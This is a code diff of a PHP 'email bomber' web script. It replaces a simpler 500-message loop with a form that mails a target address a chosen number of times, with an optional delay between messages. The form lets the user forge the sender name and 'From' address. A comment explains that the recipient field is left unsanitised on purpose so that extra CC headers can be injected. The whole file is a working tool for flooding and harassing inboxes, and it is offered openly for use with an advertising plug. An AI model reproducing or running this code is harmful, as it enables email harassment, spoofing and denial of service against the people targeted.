@@ -1,28 +1,99 @@
-<html>
-<body>
-<h1> Email Bomber Script</h1>
+<?
+/*
+Script Name: PHP Email Bomber originally by samatronic.com and by Ron
+Script Author: Ron
+Script Version: v.02
 
-<table border=2>
-<form action="" method=post>
-<tr><td>Targat Email Address: </td><td><input type=text name=email size=30></td></tr>
-<tr><td>Sender name: </td><td><input type=text name=name size=30></td></tr>
-<tr><td>Sender Email Address: </td><td><input type=text name=sender size=30></td></tr>
-<tr><td>Subject: </td><td><input type=text name=subject size=30></td></tr>
-<tr><td>Content: </td><td><textarea rows=10 cols=30 name=content></textarea></td></tr>
-<tr><td><input type=submit value="Send Mail"></td></tr>
-</form>
-</table>
+If you like this script, please visit www.goons.co.nr (my website) and click on an advertisement.
+Thank you! ~Ron :)
+*/
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+<title>PHP Emailer originally by samatronic.com and fixed by Ron</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+</head>
+<body>
 
 <?php
-$to = 'indianhacker@example.com';
-$subject = 'the subject';
-$message = 'hello';
-$headers = 'From: webmaster@example.com' . "\r\n" .
-'Reply-To: webmaster@example.com' . "\r\n" .
-'X-Mailer: PHP/' . phpversion();
+$name = stripslashes(htmlspecialchars($_POST['name']));
+$to = htmlspecialchars($_POST['to']); // purposely does not stripslashes so you can put in blah@blah.com\nCC:blah2@blah.com
+$from = stripslashes(htmlspecialchars($_POST['from']));
+$subject = stripslashes(htmlspecialchars($_POST['subject']));
+$count = $_POST['count'];
+$sleep = $_POST['sleep'];
+$message = stripslashes(nl2br($_POST['message'])); // doesn't use htmlspecialchars on purpose in order to send messages w/ html
 
-for ($i=1; $i <= 500; $i++)
+if (isset($_POST['submit'])) // if submit button is pressed...
 {
-mail($to, $subject, $message, $headers );
+  if (empty($count) || $count == 0 || !is_numeric($count))
+    $count = 1;
+  if (empty($sleep) || !is_numeric($sleep))
+    $sleep = 0;
+  $headers = "From: $name <$from>\nReply-To: $from\nContent-Type:text/html"; // shows name, from, and makes the email able to use html
+  echo "<p>Sending $count email(s) to: " . str_replace("\n", " ", $to) . "<br />\nThe wait is $sleep seconds in between each email.</p>\n\n";
+  $count++; // increment $count because we are starting $i at 1
+  for ($i = 1; $i < $count; $i++)
+  {
+    if (mail($to, $subject, $message, $headers))
+      $check = "<span style=\"color: #00FF00;\">Sent</span>";
+    else
+      $check = "<span style=\"color: #FF0000;\">Not Sent.</span>";
+    echo "Email $i: " . $check . " <br />\n";
+    if ($i < $count - 1 && $sleep != 0)
+      sleep($sleep);
+  }
+  echo "\n<br /><a href=\"$_SERVER[PHP_SELF]\">Would you like to send some more emails?</a>\n";
 }
-?></body></html>
+  else
+{
+?>
+
+<div align="center">
+<p style="font-size: 25px;">PHP Emailer originally by samatronic.com and fixed by Ron</p>
+<form action="<?=$_SERVER['PHP_SELF'];?>" method="post">
+  <table width="600">
+    <tr>
+      <td>Name:</td>
+      <td><input type="text" name="name" id="name" value="<?=$name;?>" /></td>
+    </tr>
+    <tr>
+      <td>To:</td>
+      <td><input type="text" name="to" id="to" value="<?=$to;?>" /></td>
+    </tr>
+    <tr>
+      <td>From:</td>
+      <td><input type="text" name="from" id="from" value="<?=$from;?>" /></td>
+    </tr>
+    <tr>
+      <td>Subject:</td>
+      <td><input type="text" name="subject" id="subject" value="<?=$subject;?>" /></td>
+    </tr>
+    <tr>
+      <td>Times:</td>
+      <td><input type="text" name="count" id="count" value="<?=$count;?>" /></td>
+    </tr>
+    <tr>
+      <td>Wait Time (in seconds):</td>
+      <td><input type="text" name="sleep" id="sleep" value="<?=$sleep;?>" /></td>
+    </tr>
+    <tr>
+      <td valign="top">Message:</td>
+      <td><textarea cols="50" rows="5" name="message" id="message"><?=$message;?></textarea></td>
+    </tr>
+    <tr>
+      <td colspan="2" align="center"><input type="submit" name="submit" id="submit" value="Send Emails" /></td>
+    </tr>
+  </table>
+</form>
+</div>
+
+<?
+}
+?>
+
+<p style="font-weight: bold; text-align: center;">Did you like this script? Please visit <a href="http://www.goons.co.nr" target="_blank">www.GOONS.co.nr</a> (my website)<br />
+and please click on an advertisement! Thank you! ~Ron :)</p>
+</body>
+</html>
